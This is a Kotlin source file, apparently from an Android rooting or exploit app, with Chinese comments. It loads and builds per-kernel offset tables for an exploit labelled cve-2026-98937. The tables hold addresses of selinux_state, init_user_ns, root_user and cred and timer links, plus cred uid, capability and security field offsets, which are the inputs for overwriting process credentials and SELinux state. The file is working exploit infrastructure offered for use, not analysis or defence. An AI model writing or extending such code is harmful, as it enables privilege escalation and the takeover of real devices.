package com.extractkit.app

import android.content.Context

/**
 * 内置的 98937 内核表（来自 assets/cve98937/profiles 下的 conf 文件）。
 * 文件是简化 TOML，字段是**负偏移编码的内核地址**，这里统一还原成正数地址。
 */
object Cve98937Tables {

    private var cache: List<Cve98937.Table>? = null

    fun all(ctx: Context): List<Cve98937.Table> {
        cache?.let { return it }
        val list = ArrayList<Cve98937.Table>()
        val names = runCatching { ctx.assets.list("cve98937/profiles") }.getOrNull() ?: emptyArray()
        for (n in names) {
            if (!n.endsWith(".conf") || n == "index.conf") continue
            val text = runCatching {
                ctx.assets.open("cve98937/profiles/$n").bufferedReader().readText()
            }.getOrNull() ?: continue
            runCatching { parse(text) }.getOrNull()?.let { list.add(it) }
        }
        cache = list
        return list
    }

    fun match(ctx: Context, release: String): Cve98937.Table? =
        all(ctx).firstOrNull { release.startsWith(it.release.take(24)) || release == it.release }

    /** 解析一个 .conf；地址字段在文件里是负数（= 无符号内核地址的补码）。 */
    fun parse(text: String): Cve98937.Table {
        val kv = HashMap<String, String>()
        for (line in text.lineSequence()) {
            val t = line.trim()
            if (t.isEmpty() || t.startsWith("#") || t.startsWith("{") || t == "}") continue
            if (t.startsWith("offset") || t == "}") continue
            val i = t.indexOf('=')
            if (i <= 0) continue
            val k = t.substring(0, i).trim()
            val v = t.substring(i + 1).trim().trim(',').trim('"')
            if (v.isNotEmpty()) kv.putIfAbsent(k, v)
        }
        fun hex(k: String, def: Long = 0): Long {
            val v = kv[k] ?: return def
            return v.toLongOrNull()?.let { it and 0xFFFF_FFFF_FFFF_FFFFuL.toLong() } ?: def
        }
        fun num(k: String, def: Int = 0): Int = kv[k]?.toIntOrNull() ?: def

        return Cve98937.Table(
            release = kv["release"] ?: "?",
            pageOffset = hex("page_offset"),
            timerLink = hex("timer_link"),
            credLink = hex("cred_link"),
            selinuxLink = hex("selinux_link"),
            userNs = hex("user_ns"),
            rootUser = hex("root_user"),
            groups = hex("groups"),
            ucounts = hex("ucounts"),
            taskCred = num("task_cred"),
            taskStructSize = num("task_struct_size"),
            credUid = num("cred_uid"),
            kitimerNode = num("kitimer_node", 0x78),
            kitimerSize = num("kitimer_size"),
            credSize = num("cred_size"),
            credSecurity = num("cred_security", 0x80),
            credUser = num("cred_user", 0x88),
            credUserNs = num("cred_user_ns", 0x90),
            credUcounts = num("cred_ucounts", 0x98),
            credGroups = num("cred_groups", 0xa0),
            vulnType = kv["vuln_type"] ?: "cve-2026-98937",
        )
    }

    /**
     * 从**本机标定出来的 profile** 合成内核表（没内置 conf 时用）。
     * 关键：标定过的 profile 里有 timer/cred 的绝对地址（v6.4 起会存），
     * 结构体偏移直接来自 BTF，所以哪怕没有 conf 也能跑 98937。
     */
    fun fromProfile(ctx: Context, release: String): Cve98937.Table? {
        val p = ProfileStore.loadAll(ctx).firstOrNull {
            release.startsWith(it.prefix.take(24)) || release == it.release
        } ?: return null
        if (p.timerLink == 0L || p.credLink == 0L) return null
        val syms = p.symbols
        // caps 在 cred 里的起始位置：security 前面固定 5 个 cap 字段
        val capInh = p.offsets.credSecurity - 0x50
        return Cve98937.Table(
            release = p.release,
            timerLink = p.timerLink,
            credLink = p.credLink,
            selinuxLink = syms["selinux_state"] ?: return null,
            userNs = syms["init_user_ns"] ?: 0,
            rootUser = syms["root_user"] ?: 0,
            groups = syms["init_groups"] ?: 0,
            ucounts = syms["init_ucounts"] ?: 0,
            taskCred = p.offsets.taskCred,
            taskStructSize = p.measured.taskAllocBytes,
            credUid = p.offsets.credUid,
            kitimerNode = p.offsets.itimerNode,
            kitimerSize = p.offsets.itimerSize,
            credSize = p.offsets.credSize,
            capInheritable = capInh,
            capPermitted = capInh + 8,
            capEffective = capInh + 16,
            capBset = capInh + 24,
            capAmbient = capInh + 32,
            credSecurity = p.offsets.credSecurity,
            credUser = p.offsets.credUser,
            credUserNs = p.offsets.credUserNs,
            credUcounts = p.offsets.credUcounts,
            credGroups = p.offsets.credGroups,
        )
    }
}
